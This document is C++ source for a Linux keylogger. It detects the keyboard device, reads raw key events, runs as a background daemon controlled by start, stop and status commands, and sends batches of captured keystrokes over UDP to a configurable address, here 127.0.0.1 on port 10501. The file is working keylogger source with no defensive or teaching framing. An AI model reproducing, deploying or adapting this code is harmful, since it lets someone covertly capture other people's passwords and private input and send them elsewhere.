#include <string>
#include <filesystem>
#include <iostream>
#include <fcntl.h>
#include <cstring>
#include <unistd.h>
#include <atomic>
#include <sys/types.h>
#include <linux/input.h>
#include <cerrno>
#include <vector>
#include <csignal>
#include <cstdlib>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <mutex>
#include <thread>
#include <future>
#include <dirent.h>
#include <fstream>

#define PORT 10501
#define ADDRESS "127.0.0.1"
#define INTERVAL 500
#define MAX_KEYS_STORE 100
#define SEPARATOR '\n'
#define PID_FILE_NAME "client.pid"

const std::vector<std::string> keycodes = {
        "RESERVED",
        "ESC",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "MINUS",
        "EQUAL",
        "BACKSPACE",
        "TAB",
        "Q",
        "W",
        "E",
        "R",
        "T",
        "Y",
        "U",
        "I",
        "O",
        "P",
        "LEFTBRACE",
        "RIGHTBRACE",
        "ENTER",
        "LEFTCTRL",
        "A",
        "S",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "L",
        "SEMICOLON",
        "APOSTROPHE",
        "GRAVE",
        "LEFTSHIFT",
        "BACKSLASH",
        "Z",
        "X",
        "C",
        "V",
        "B",
        "N",
        "M",
        "COMMA",
        "DOT",
        "SLASH",
        "RIGHTSHIFT",
        "KPASTERISK",
        "LEFTALT",
        "SPACE",
        "CAPSLOCK",
        "F1",
        "F2",
        "F3",
        "F4",
        "F5",
        "F6",
        "F7",
        "F8",
        "F9",
        "F10",
        "NUMLOCK",
        "SCROLLLOCK"
};

void save_pid(pid_t pid) {
    std::ofstream f;
    f.open(PID_FILE_NAME);
    f.clear();
    f << pid;
    f.close();
}

void delete_pid() {
    std::filesystem::remove(PID_FILE_NAME);
}

pid_t read_pid() {
    pid_t pid;
    std::fstream f(PID_FILE_NAME);
    f.clear();
    f >> pid;
    f.close();
    return pid;
}

bool check_daemon() {
    if (std::filesystem::exists(PID_FILE_NAME)) {
        if (std::filesystem::exists("/proc/" + std::to_string(read_pid()))) {
            return true;
        } else {
            delete_pid();
            return false;
        }
    } else {
        return false;
    }
}

bool loop = true;

std::vector<std::string> queue_keys = {};
std::mutex queue_keys_mtx;

unsigned long add_to_queue_keys(const std::string &value) {
    std::lock_guard<std::mutex> lock(queue_keys_mtx);
    queue_keys.push_back(value);
    return queue_keys.size();
}

void errno_abort(const char *header) {
    std::cerr << "Error on " << header << '\n';
    exit(EXIT_FAILURE);
}

struct sockaddr_in send_addr{};
int socket_fd;

void create_socket() {
    int true_flag = 1;
    if ((socket_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
        errno_abort("socket");

    if (setsockopt(socket_fd, SOL_SOCKET, SO_BROADCAST,
                   &true_flag, sizeof true_flag) < 0)
        errno_abort("setsockopt");

    memset(&send_addr, 0, sizeof send_addr);
    send_addr.sin_family = AF_INET;
    send_addr.sin_port = (in_port_t) htons(PORT);
    inet_aton(ADDRESS, &send_addr.sin_addr);
}

void send_keys() {
    std::lock_guard<std::mutex> lock(queue_keys_mtx);
    if (!queue_keys.empty()) {
        std::string message;
        for (const std::string &key: queue_keys) {
            message += key + SEPARATOR;
        }
        const char *cmessage = message.c_str();
        if (sendto(socket_fd, cmessage, strlen(cmessage), 0,
                   (struct sockaddr *) &send_addr, sizeof send_addr) < 0)
            errno_abort("send");
        std::cerr << "Keys sent" << '\n';
        queue_keys.clear();
    }
}

void collect_key(const std::string &key_name) {
    std::cout << key_name << '\n';
    auto count = add_to_queue_keys(key_name);
    if (count >= MAX_KEYS_STORE)
        send_keys();
}

void interval_sending() {
    std::this_thread::sleep_for(std::chrono::milliseconds(INTERVAL));
    while (loop) {
        send_keys();
        std::this_thread::sleep_for(std::chrono::milliseconds(INTERVAL));
    }
}

void sigint_handler(int sig) {
    std::cerr << "Stopping " << gettid() << '\n';
    loop = false;
}

void set_signals_hendlers() {
//    signal(SIGKILL, sigint_handler);
//    signal(SIGABRT, sigint_handler);
    signal(SIGILL, sigint_handler);
//    signal(SIGINT, sigint_handler);
    signal(SIGTERM, sigint_handler);
}

void keylogger(int keyboard) {
    set_signals_hendlers();

    create_socket();
    std::thread thread_obj(interval_sending);

    int eventSize = sizeof(struct input_event);
    size_t bytesRead = 0;
    const unsigned int number_of_events = 128;
    struct input_event events[number_of_events];
    int i;

    while (loop) {
        bytesRead = read(keyboard, events, eventSize * number_of_events);
        for (i = 0; i < (bytesRead / eventSize); ++i) {
            if (events[i].type == EV_KEY) {
                if (events[i].value == 1) {
                    std::string key_name;
                    if (events[i].code > 0 && events[i].code < keycodes.size()) {
                        key_name = keycodes[events[i].code];
                    } else {
                        key_name = "KEY_" + std::to_string(events[i].code);
                    }
                    collect_key(key_name);
                }
            }
        }
    }
    thread_obj.join();
    send_keys();
}

std::string get_kb_device() {
    std::string kb_device;
    for (auto &p: std::filesystem::directory_iterator("/dev/input/")) {
        std::filesystem::file_status status = std::filesystem::status(p);
        if (std::filesystem::is_character_file(status)) {
            std::string filename = p.path().string();
            int fd = open(filename.c_str(), O_RDONLY);
            if (fd == -1) {
                std::cerr << "Error: " << strerror(errno) << '\n';
                continue;
            }
            int32_t event_bitmap = 0;
            int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;
            ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if ((EV_KEY & event_bitmap) == EV_KEY) {
                // The device acts like a keyboard
                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if ((kbd_bitmap & event_bitmap) == kbd_bitmap) {
                    // The device supports A, B, C, Z keys, so it probably is a keyboard
                    kb_device = filename;
                    close(fd);
                    break;
                }
            }
            close(fd);
        }
    }
    return kb_device;
}

int daemon() {
    std::string kb_device = get_kb_device();

    int keyboard;
    if ((keyboard = open(kb_device.c_str(), O_RDONLY)) < 0) {
        std::cerr << "Error accessing keyboard from " << kb_device << ". May require you to be superuser." << '\n';
        return 1;
    }
    std::cerr << "Keyboard device: " << kb_device << '\n';

    keylogger(keyboard);

    close(keyboard);
    delete_pid();
    return 0;
}

void print_help() {
    std::cout << "client [start/stop/status]" << '\n';
}

int start_daemon() {
    pid_t daemon_pid = fork();
    if ((daemon_pid) < 0) {
        errno_abort("fork");
        exit(1);
    } else if (daemon_pid != 0) {
        std::cout << "Daemon running on PID: " << daemon_pid << '\n';
        save_pid(daemon_pid);
        exit(0);
    }
    setsid();
    return daemon();
}

void stop_daemon() {
    kill(read_pid(), SIGILL);
}

int main(int argc, char *argv[]) {
//    return daemon();

    if (argc != 2) {
        print_help();
        exit(1);
    }

    std::string argument(argv[1]);
    if (argument == "start") {
        if (!check_daemon()) {
            return start_daemon();
        } else {
            std::cout << "Daemon already running. PID: " << read_pid() << '\n';
        }
    } else if (argument == "stop") {
        if (check_daemon()) {
            stop_daemon();
        } else {
            std::cout << "Daemon already stopped." << '\n';
        }
    } else if (argument == "status") {
        if (check_daemon()) {
            std::cout << "Daemon is running. PID: " << read_pid() << '\n';
        } else {
            std::cout << "Daemon is stopped." << '\n';
        }
    }

    return 0;
}